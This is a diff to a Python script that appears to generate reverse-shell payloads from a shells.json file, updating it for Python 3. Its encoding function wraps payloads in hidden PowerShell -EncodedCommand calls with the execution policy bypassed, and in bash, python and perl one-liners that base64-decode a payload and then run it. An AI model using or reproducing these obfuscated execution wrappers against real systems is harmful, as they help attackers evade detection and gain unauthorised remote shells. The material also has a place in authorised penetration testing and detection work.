@@ -27,12 +27,6 @@ C_RED = "\033[91m" if "linux" in platform.system().lower() else ""
 g_json_data = None
 g_payload_count = 0
 
-# Forcing Python json module to work with ASCII
-# https://stackoverflow.com/questions/9590382/forcing-python-json-module-to-work-with-ascii
-def ascii_encode_dict(data):
-    ascii_encode = lambda x: x.encode('ascii')
-    return dict(map(ascii_encode, pair) for pair in data.items())
-
 # Command encoding techniques 
 # [BROKEN] https://jthuraisamy.github.io/archives.html/runtime-exec-payloads.html
 # [CACHE] https://webcache.googleusercontent.com/search?q=cache:5AdcRIUec4sJ:https://jackson.thuraisamy.me/runtime-exec-payloads.html+&cd=1&hl=fr&ct=clnk&gl=fr
@@ -40,14 +34,14 @@ def encode_payload(payload, os_type, enc_type):
     res = ""
     if os_type == "windows":
         if enc_type == "powershell":
-            res = "powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand \"{}\"".format(b64encode(payload.encode('UTF-16LE')))
+            res = "powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand \"{}\"".format(b64encode(payload.encode('UTF-16LE')).decode('ascii'))
     elif os_type == "linux":
         if enc_type == "shell":
-            res = "bash -c \"{echo,%s}|{base64,-d}|{bash,-i}\"" % b64encode(payload)
+            res = "bash -c \"{echo,%s}|{base64,-d}|{bash,-i}\"" % b64encode(payload.encode(encoding='ascii')).decode('ascii')
         elif enc_type == "python":
-            res = "python -c \"exec('%s'.decode('base64'))\"" % b64encode(payload)
+            res = "python -c \"exec('%s'.decode('base64'))\"" % b64encode(payload.encode(encoding='ascii')).decode('ascii')
         elif enc_type == "perl":
-            res = "perl -MMIME::Base64 -e \"eval(decode_base64('%s'))\"" % b64encode(payload)
+            res = "perl -MMIME::Base64 -e \"eval(decode_base64('%s'))\"" % b64encode(payload.encode(encoding='ascii')).decode('ascii')
     else:
         print("{}[!] Unknown OS: {}{}".format(C_YEL, os_type, C_RST))
     return res
@@ -67,7 +61,8 @@ def main():
     json_path = "{}/shells.json".format(dir_path)
     
     with open(json_path) as f:
-        g_json_data = json.load(f, object_hook=ascii_encode_dict)
+        g_json_data = json.load(f)
+        #g_json_data = json.load(f, object_hook=ascii_encode_dict)
     
     payloads = ['all']
     for i in range(len(g_json_data)):
